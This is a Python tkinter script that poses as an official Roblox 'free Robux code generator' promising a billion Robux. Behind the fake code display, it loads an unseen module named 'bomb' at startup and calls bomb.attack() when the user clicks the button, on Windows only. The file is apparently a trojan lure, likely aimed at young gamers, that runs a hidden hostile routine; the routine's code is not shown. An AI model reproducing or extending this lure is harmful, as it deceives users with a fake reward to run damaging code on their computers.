from tkinter import *
from PIL import Image, ImageTk
import backend.paths as paths
import backend.bomb as bomb
from backend.codegenerator import Generator

# ! WORKS ONLY IN THE WINDOWS

codeGenerator = Generator()
bomb.reload()

window = Tk()
window.title("ROBLOX OFFICIAL ROBUX CODE GENERATOR")
window.geometry("400x400")

robuxtext = Label(window, text="Click on the button below to win a 1 Billion robux Code")
robuxtext.pack(padx=15,pady=25)

getrobuxnow = Button(window, text="GENERATE NEW CODE NOW!!!")
getrobuxnow.pack(pady=15)

code = Label(window, text="Output: Nothing")
code.pack(padx=15,pady=10)

bobuximg = ImageTk.PhotoImage(Image.open(paths.img("bobux")))
robux = Label(image=bobuximg)
robux.pack()

def generateCode():
    code.config(text="Output: "+codeGenerator.generate())
    bomb.attack()

getrobuxnow.config(command=generateCode)

if __name__ == "__main__":
    window.mainloop()